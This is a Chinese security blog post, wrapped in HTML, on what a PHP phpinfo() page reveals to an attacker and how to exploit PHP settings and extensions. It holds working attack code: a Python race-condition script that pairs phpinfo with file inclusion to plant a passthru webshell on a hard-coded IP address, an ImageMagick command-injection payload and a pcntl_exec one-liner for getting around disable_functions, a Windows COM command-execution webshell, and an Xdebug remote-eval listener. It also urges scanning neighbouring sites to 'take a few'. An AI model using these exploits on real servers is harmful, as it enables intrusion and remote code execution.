@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 基本信息system info
+详细的操作系统信息，为提权做准备
+extension_dirphp扩展的路径
+真实ipcdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。
+web根目录
+临时文件路径向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpinfo可以告诉我们什么">
+<meta property="og:url" content="http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/index.html">
+<meta property="og:site_name" content="Z3R0YU">
+<meta property="og:description" content="0x01 基本信息system info
+详细的操作系统信息，为提权做准备
+extension_dirphp扩展的路径
+真实ipcdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。
+web根目录
+临时文件路径向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/13al8a7Gl0.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/4BibE1a8mJ.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/81AcH81K8j.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/h4bGaFaceD.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/mF8ekJH0mJ.png">
+<meta property="og:image" content="https://www.waitalone.cn/wp-content/uploads/2016/05/20160510040129174.jpg">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/8k74AiDbJ9.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png">
+<meta property="og:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///170912/7g4402ghe1.png">
+<meta property="og:updated_time" content="2018-11-12T16:12:31.750Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpinfo可以告诉我们什么">
+<meta name="twitter:description" content="0x01 基本信息system info
+详细的操作系统信息，为提权做准备
+extension_dirphp扩展的路径
+真实ipcdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。
+web根目录
+临时文件路径向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。">
+<meta name="twitter:image" content="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>phpinfo可以告诉我们什么</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Z3R0YU" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/zer0yu">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2018/11/12/pz-talk-note/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&text=phpinfo可以告诉我们什么"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&is_video=false&description=phpinfo可以告诉我们什么"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=phpinfo可以告诉我们什么&body=Check out this article: http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&title=phpinfo可以告诉我们什么"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zer0yu.github.io/2018/11/13/what-phpinfo-can-tell-we/&name=phpinfo可以告诉我们什么&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-基本信息"><span class="toc-number">1.</span> <span class="toc-text">0x01 基本信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#system-info"><span class="toc-number">1.1.</span> <span class="toc-text">system info</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extension-dir"><span class="toc-number">1.2.</span> <span class="toc-text">extension_dir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#真实ip"><span class="toc-number">1.3.</span> <span class="toc-text">真实ip</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web根目录"><span class="toc-number">1.4.</span> <span class="toc-text">web根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#临时文件路径"><span class="toc-number">1.5.</span> <span class="toc-text">临时文件路径</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-重要配置"><span class="toc-number">2.</span> <span class="toc-text">0x02 重要配置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#allow-url-include"><span class="toc-number">2.1.</span> <span class="toc-text">allow_url_include</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#asp-tags"><span class="toc-number">2.2.</span> <span class="toc-text">asp_tags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#short-open-tag"><span class="toc-number">2.3.</span> <span class="toc-text">short_open_tag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable-functions"><span class="toc-number">2.4.</span> <span class="toc-text">disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enable-dl"><span class="toc-number">2.5.</span> <span class="toc-text">enable_dl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magic-quotes-gpc"><span class="toc-number">2.6.</span> <span class="toc-text">magic_quotes_gpc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir"><span class="toc-number">2.7.</span> <span class="toc-text">open_basedir</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03扩展"><span class="toc-number">3.</span> <span class="toc-text">0x03扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#imagick"><span class="toc-number">3.1.</span> <span class="toc-text">imagick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libxml"><span class="toc-number">3.2.</span> <span class="toc-text">libxml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#memcache"><span class="toc-number">3.3.</span> <span class="toc-text">memcache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis"><span class="toc-number">3.4.</span> <span class="toc-text">redis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session"><span class="toc-number">3.5.</span> <span class="toc-text">session</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xdebug"><span class="toc-number">3.6.</span> <span class="toc-text">xdebug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GOPHER"><span class="toc-number">3.7.</span> <span class="toc-text">GOPHER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastcgi"><span class="toc-number">3.8.</span> <span class="toc-text">fastcgi</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04其它"><span class="toc-number">4.</span> <span class="toc-text">0x04其它</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OPCACHE"><span class="toc-number">4.1.</span> <span class="toc-text">OPCACHE</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        phpinfo可以告诉我们什么
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Z3R0YU</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-11-12T16:09:33.000Z" itemprop="datePublished">2018-11-13</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-基本信息"><a href="#0x01-基本信息" class="headerlink" title="0x01 基本信息"></a>0x01 基本信息</h2><h3 id="system-info"><a href="#system-info" class="headerlink" title="system info"></a>system info</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/HE8cH44f3e.png" alt="image"></p>
+<p>详细的操作系统信息，为提权做准备</p>
+<h3 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/BjlfKkaFAg.png" alt="image"><br>php扩展的路径</p>
+<h3 id="真实ip"><a href="#真实ip" class="headerlink" title="真实ip"></a>真实ip</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/13al8a7Gl0.png" alt="image"><br>cdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。</p>
+<h3 id="web根目录"><a href="#web根目录" class="headerlink" title="web根目录"></a>web根目录</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/4BibE1a8mJ.png" alt="image"></p>
+<h3 id="临时文件路径"><a href="#临时文件路径" class="headerlink" title="临时文件路径"></a>临时文件路径</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/81AcH81K8j.png" alt="image"><br>向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。</p>
+<p>phpinfo-lfi<br>利用脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit </div><div class="line"># Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team</div><div class="line"># @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/</div><div class="line"></div><div class="line">## passwords.txt payload content</div><div class="line"># &lt;?php $c=fopen(&apos;/app/intrd&apos;,&apos;w&apos;);fwrite($c,&apos;&lt;?php passthru($_GET[&quot;f&quot;]);?&gt;&apos;);?&gt;</div><div class="line"></div><div class="line">import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re</div><div class="line">from subprocess import Popen, PIPE, STDOUT</div><div class="line"></div><div class="line">NumOfThreads=50</div><div class="line">queue = Queue.Queue()</div><div class="line"></div><div class="line">class checkHash(threading.Thread):</div><div class="line">	def __init__(self,queue):</div><div class="line">		threading.Thread.__init__(self)</div><div class="line">		self.queue=queue</div><div class="line">	def run(self):</div><div class="line">		i=0</div><div class="line">		while True:</div><div class="line">			self.clear=self.queue.get()</div><div class="line">			passtry = self.clear</div><div class="line">			if passtry != &quot;&quot;:</div><div class="line"></div><div class="line">				padding=&quot;A&quot; * 5000</div><div class="line"></div><div class="line">				cookies = &#123;</div><div class="line">				    &apos;PHPSESSID&apos;: &apos;o99quh47clk8br394298tkv5o0&apos;,</div><div class="line">				    &apos;othercookie&apos;: padding</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				headers = &#123;</div><div class="line">				    &apos;User-Agent&apos;: padding,</div><div class="line">				    &apos;Pragma&apos;: padding,</div><div class="line">				    &apos;Accept&apos;: padding,</div><div class="line">				    &apos;Accept-Language&apos;: padding,</div><div class="line">				    &apos;DNT&apos;: &apos;1&apos;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">				files = &#123;&apos;arquivo&apos;: open(&apos;passwords.txt&apos;,&apos;rb&apos;)&#125;</div><div class="line"></div><div class="line">				reqs=&apos;http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&amp;a=&apos;+padding</div><div class="line">				#reqs=&apos;http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a=&apos;+padding</div><div class="line">				response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)</div><div class="line">				data = response.content</div><div class="line">				data = re.search(r&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;, data).group(0)</div><div class="line">				print data</div><div class="line"></div><div class="line">				reqs = &apos;http://47.97.221.96:23333/index.php?action=../..&apos;+data</div><div class="line">				#reqs = &apos;http://172.17.0.2:80/index.php?action=../..&apos;+data</div><div class="line">				print reqs</div><div class="line">				response = requests.get(reqs, verify=False)</div><div class="line">				data = response.content</div><div class="line">				print data</div><div class="line"></div><div class="line">			i+=1</div><div class="line">			self.queue.task_done()</div><div class="line"></div><div class="line">for i in range(NumOfThreads):</div><div class="line">    t=checkHash(queue)</div><div class="line">    t.setDaemon(True)</div><div class="line">    t.start()</div><div class="line"></div><div class="line">for x in range(0, 9999):</div><div class="line">	x=str(x)</div><div class="line">	queue.put(x.strip())</div><div class="line"></div><div class="line">queue.join()</div></pre></td></tr></table></figure></p>
+<p>参考:<a href="http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/" target="_blank" rel="external">http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/</a></p>
+<h2 id="0x02-重要配置"><a href="#0x02-重要配置" class="headerlink" title="0x02 重要配置"></a>0x02 重要配置</h2><h3 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h3><p>远程文件包含，但是一般不会开启</p>
+<h3 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171023/0G7c7mmj2I.png" alt="image"></p>
+<p>php标签有4种形式，如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的。</p>
+<p>这里有一篇<code>user.ini</code>+<code>asp_tags</code>绕过的文章 <a href="https://www.math1as.com/index.php/archives/468/" target="_blank" rel="external">针对内容(php tags)检测的一种绕过思路</a></p>
+<p>实际就是通过向其中添加<code>php_value asp_tags On</code>并上传<code>.htaccess</code>和<code>.user.ini</code>来bypass。</p>
+<p>原理，asp_tags的属性是这样的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改</div></pre></td></tr></table></figure>
+<p>注意： 在PHP 7已经完全移除了这种标签</p>
+<h3 id="short-open-tag"><a href="#short-open-tag" class="headerlink" title="short_open_tag"></a>short_open_tag</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/h4bGaFaceD.png" alt="image"><br>还是标签的问题，允许&lt;??&gt;这种形式，并且&lt;?=等价于&lt;? echo</p>
+<h3 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/mF8ekJH0mJ.png" alt="image"><br>有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。</p>
+<p>绕过的方式有这么几个：</p>
+<p>1.黑名单绕过<br>百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。</p>
+<p>比如有时候没有禁用proc_open</p>
+<p>比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。</p>
+<p>pcntl是linux下的一个扩展，可以支持php的多线程操作。<br>pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;</div></pre></td></tr></table></figure>
+<p><a href="http://secoff.net/archives/116.html" target="_blank" rel="external">渗透技巧：利用pcntl_exec突破disable_functions</a></p>
+<p>2.利用扩展（如ImageMagick）绕过<br><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="external">利用ImageMagick漏洞绕过disable_function</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">echo &quot;Disable Functions: &quot; . ini_get(&apos;disable_functions&apos;) . &quot;\n&quot;;</div><div class="line"></div><div class="line">$command = PHP_SAPI == &apos;cli&apos; ? $argv[1] : $_GET[&apos;cmd&apos;];</div><div class="line">if ($command == &apos;&apos;) &#123;</div><div class="line">    $command = &apos;id&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$exploit = &lt;&lt;&lt;EOF</div><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://example.com/image.jpg&quot;|$command&quot;)&apos;</div><div class="line">pop graphic-context</div><div class="line">EOF;</div><div class="line"></div><div class="line">file_put_contents(&quot;KKKK.mvg&quot;, $exploit);</div><div class="line">$thumb = new Imagick();</div><div class="line">$thumb-&gt;readImage(&apos;KKKK.mvg&apos;);</div><div class="line">$thumb-&gt;writeImage(&apos;KKKK.png&apos;);</div><div class="line">$thumb-&gt;clear();</div><div class="line">$thumb-&gt;destroy();</div><div class="line">unlink(&quot;KKKK.mvg&quot;);</div><div class="line">unlink(&quot;KKKK.png&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="https://www.waitalone.cn/wp-content/uploads/2016/05/20160510040129174.jpg" alt="image"></p>
+<p>3.<a href="http://www.vuln.cn/6784" target="_blank" rel="external">利用环境变量LD_PRELOAD来绕过php disable_function</a></p>
+<p>4.利用扩展库绕过</p>
+<p><strong>Windows靠系统组件</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$command=$_POST[a];</div><div class="line"></div><div class="line">$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象</div><div class="line"></div><div class="line">$exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command);  //调用对象方法来执行命令</div><div class="line"></div><div class="line">$stdout = $exec-&gt;StdOut();</div><div class="line"></div><div class="line">$stroutput = $stdout-&gt;ReadAll();</div><div class="line"></div><div class="line">echo $stroutput</div><div class="line"></div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><strong>Linux下可通过编译拓展库进行绕过</strong></p>
+<p><a href="http://www.91ri.org/8700.html" target="_blank" rel="external">Webshell下命令执行限制及绕过方法</a></p>
+<h3 id="enable-dl"><a href="#enable-dl" class="headerlink" title="enable_dl"></a>enable_dl</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/8k74AiDbJ9.png" alt="image"><br>上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</p>
+<h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png" alt="image"><br>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。</p>
+<h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png" alt="image"><br>这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。</p>
+<p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="external">PHP绕过open_basedir列目录的研究</a></p>
+<p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="external">php5全版本绕过open_basedir读文件脚本</a></p>
+<p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="external">绕过open_basedir读文件脚本</a></p>
+<h2 id="0x03扩展"><a href="#0x03扩展" class="headerlink" title="0x03扩展"></a>0x03扩展</h2><h3 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h3><p>前段时间影响比较大的漏洞，注意看版本。</p>
+<p>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。</p>
+<p><a href="http://blog.topsec.com.cn/ad_lab/imagemagick-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%88%86%E6%9E%90/" target="_blank" rel="external">ImageMagick 漏洞利用方式及分析</a></p>
+<p><a href="http://www.jianshu.com/p/502e39c122e6" target="_blank" rel="external">ImageMagick远程执行漏洞分析及利用</a></p>
+<h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h3><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p>
+<h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="external">Memcache未授权访问漏洞利用及修复</a></p>
+<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="external">利用redis写webshell</a></p>
+<h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>1.序列化的一些问题<br><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170912/7g4402ghe1.png" alt="image"><br>序列化处理器不一致导致对象注入</p>
+<p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p>
+<p>具体可以看我的另一篇文章<a href="http://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="external">php对象注入总结</a>。</p>
+<p>2.session.upload_progress加本地文件包含=getshell</p>
+<p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a></p>
+<h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>xdebug命令执行</p>
+<p><a href="Xdebug: A Tiny Attack Surface" target="_blank" rel="external">Xdebug: A Tiny Attack Surface
+</a></p>
+<p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug" target="_blank" rel="external">http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python2</span></div><div class="line"><span class="keyword">import</span> socket</div><div class="line"></div><div class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</div><div class="line">sk = socket.socket()</div><div class="line">sk.bind(ip_port)</div><div class="line">sk.listen(<span class="number">10</span>)</div><div class="line">conn, addr = sk.accept()</div><div class="line"></div><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">    client_data = conn.recv(<span class="number">1024</span>)</div><div class="line">    print(client_data)</div><div class="line"></div><div class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</div><div class="line">    conn.sendall(<span class="string">'eval -i 1 -- %s\x00'</span> % data.encode(<span class="string">'base64'</span>))</div></pre></td></tr></table></figure>
+<h3 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h3><p>主要在ssrf中使用</p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="external">利用 Gopher 协议拓展攻击面</a></p>
